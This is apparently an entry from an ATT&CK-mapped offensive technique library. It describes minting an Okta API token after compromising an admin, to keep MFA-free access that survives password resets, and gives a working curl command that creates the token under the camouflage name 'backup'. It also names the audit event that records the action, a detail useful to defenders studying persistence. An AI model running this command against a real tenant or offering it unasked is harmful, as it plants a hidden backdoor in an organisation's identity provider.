---
id: okta-api-token
title: Okta API token (long-lived tenant persistence)
section: Okta / identity provider
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1098]
platform: [okta]
source: Okta post-compromise persistence
pair: okta-api-token-audit
---

After compromising an admin, mint an API token: long-lived, MFA-free,
non-interactive, carrying the creator's privileges, and surviving the admin's
password/session reset — a clean tenant backdoor. Created in the admin console
(Security → API → Tokens) or programmatically with an admin session; either way it
writes `system.api_token.create`. (Cloud IdP — no slots.)

```sh
curl -s -X POST "https://<org>.okta.com/api/v1/api-tokens" -H "Authorization: SSWS <admin-token>" -H "Content-Type: application/json" -d '{"name":"backup"}'
```
